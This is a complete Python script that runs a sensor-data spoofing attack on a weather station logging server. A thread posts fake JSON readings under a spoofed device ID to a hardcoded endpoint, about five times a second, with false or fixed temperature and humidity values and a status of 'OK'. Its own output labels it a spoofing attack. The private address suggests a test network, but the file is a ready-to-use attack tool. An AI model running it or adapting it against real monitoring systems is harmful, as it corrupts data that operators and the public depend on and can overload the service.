import requests
import threading
import time
import random

server_url = 'http://10.34.221.112:5000/log'  # Change to your weather station server endpoint

stop_flag = False

def spoofing_pattern():
    global stop_flag
    while not stop_flag:
        # Alternate between blocks of spoofed temperature and humidity values
        spoofed_temp = random.choice([99.9, -99.9, 25.5, 0.0])   # Choose obviously fake or fixed plausible value
        spoofed_humid = random.choice([0.0, 99.9, 90.1, 55.0])   # Choose obviously fake or fixed plausible value
        block_size = random.randint(50, 300)
        for _ in range(block_size):
            if stop_flag:
                break
            spoofed_data = {
                "device_id": "weather_station_fake",     # Use a spoofed ID!
                "temperature": spoofed_temp,
                "humidity": spoofed_humid,
                "status": "OK",
                "error_message": "-"
            }
            try:
                response = requests.post(server_url, json=spoofed_data, timeout=2)
                print(response.status_code, response.text, spoofed_data)
            except Exception as e:
                print("Error:", e)
            time.sleep(0.2)  # ~5 requests/sec, adjust as needed

def main():
    global stop_flag
    spoofing_thread = threading.Thread(target=spoofing_pattern)
    spoofing_thread.start()
    print("Weather station spoofing attack running. Press Ctrl+C to stop.")
    try:
        while spoofing_thread.is_alive():
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_flag = True
        print("\nScript interrupted by user. Stopping spoofing attack...")
        spoofing_thread.join()
        print("Spoofing attack stopped.")

if __name__ == "__main__":
    main()
